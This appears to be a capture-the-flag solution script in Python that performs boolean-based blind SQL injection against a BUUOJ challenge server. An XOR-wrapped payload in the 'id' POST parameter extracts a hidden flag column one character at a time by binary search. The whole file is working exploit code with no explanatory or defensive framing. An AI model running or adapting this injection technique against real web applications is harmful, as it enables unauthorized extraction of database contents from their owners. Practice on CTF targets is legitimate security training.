
import time

import requests

url = "http://8cec6b78-a714-4070-a44a-bec8e7914d14.node4.buuoj.cn:81/index.php"
playload = {"id": ""}
flag = ""

for x in range(1, 1000):
    low = 32
    high = 127
    mid = (low + high) // 2
    while low < high:
        playload["id"] = "1^(ascii(substr((select(group_concat(flag))from(f1ag_1s_h3r3_hhhhh)),{},1))>{})^1".format(x, mid)
        r = requests.post(url, data=playload)
        r.encoding = "utf-8"
        if r.text.find("Nu1L") != -1:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if mid == 32 or mid == 132:
        break
    flag += chr(mid)
    print(flag)
    time.sleep(1)

if __name__ == '__main__':
    print(flag)
